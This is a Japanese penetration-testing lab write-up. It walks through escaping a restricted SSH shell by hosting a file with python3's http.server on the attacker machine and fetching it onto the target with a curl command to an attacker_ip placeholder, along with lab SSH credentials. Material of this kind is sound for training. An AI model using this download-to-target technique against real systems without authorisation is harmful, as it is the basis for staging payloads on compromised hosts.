---
tags:
  - ペネトレーションテスト
title: HTTPファイル転送(Linux)
---


SSHを使用して一般ユーザとしてログインし、指示されたタスクを完了してください。

なお、攻撃対象マシンに接続するには、以下の認証情報を用いて、SSH接続します。

    ユーザ名: user
    パスワード: password
    ポート番号: 2223

SSHコマンドは以下の通りとなります。

```
ssh -p 2223 user@10.234.132.140

```

ログインディレクトリ`/home/user`に、`this is a file to get a flag!!!`という内容を持つ`file.txt`ファイルを配置してください。ハッシュ値は、MD5で`8c1b553e197b7ceb4035b4d86034476c`となります。毎分ごとに確認が行われ、正しく配置されていると、ログインディレクトリに`flag.txt`が配置されます。その中に示されているフラグ文字列を解答してください。


## 解説

まず、SSHを利用して攻撃対象マシンにログインします。

```
ssh -p 2223 user@<target1_ip>
```

ログインすると、以下のようなバナーが表示され、使用できるコマンドに制限があることがわかります。

```
**********************************************
*                                            *
* Welcome to a Restricted Shell Environment! *
* Only specific commands are allowed here.   *
* Type 'help' to see the list of commands.   *
*                                            *
**********************************************

Available commands:
ls
pwd
whoami
rm
date
uptime
df
du
exit
top
free
cat
curl
hostname
arch
uname
id
tty
history
last
w
groups
users
help

```
ログインディレクトリ/home/userに、this is a file to get a flag!!!という内容を持つfile.txtファイルを配置する必要があります。前述の使えるコマンドを用いてfile.txtを配置する方法を考えましょう。

コマンドを確認すると、curlコマンドが確認できます。よって、curlコマンドから上記の条件を満たすファイルを転送することを考えます。

そこでまずは、攻撃マシン (つまりkali) においてthis is a file to get a flag!!!という内容を持つfile.txtファイルを作成します。

```
echo 'this is a file to get a flag!!!' > file.txt
```

次に正しく作成されているかを確認するために、md5sumコマンドを用いてハッシュ値が8c1b553e197b7ceb4035b4d86034476cであるかを確認します。

```
md5sum file.txt
8c1b553e197b7ceb4035b4d86034476c  file.txt
```

以上の過程により、攻撃サーバにおいて正しくファイルが作成と確認ができたので、次に攻撃対象マシンのログインディレクトリ/home/userにこのファイルをfile.txtとして配置します。

そのために、まずはHTTPサーバを攻撃マシン側で用意します。

具体的には以下のコマンドよりHTTPサーバを用意することができます。

```
python3 -m http.server
```

攻撃マシン側でHTTPサーバを用意することができました。さて、攻撃対象マシンにおいては、curlコマンドが利用可能でした。curlコマンドを用いて、攻撃対象マシンから攻撃マシンにアクセスし、あらかじめ作成したfile.txt をダウンロードしましょう。

そのためには -o コマンドを用います。これにより取得した内容をファイルとしてローカル側、今回では攻撃対象マシンに保存することが可能です。

```
curl <attacker_ip>:8000/file.txt -o file.txt
```

攻撃対象マシンに正しく配置されていれば、毎分実行されているチェックが通り、flag.txtが確認できます。

実際に ls コマンドで確認してみましょう。以下のようになります。

```
restricted> ls 
file.txt  flag.txt
```

以上より、flag.txt が作成されていることが確認できました。cat コマンドを用いてフラグ内容を取得しましょう。
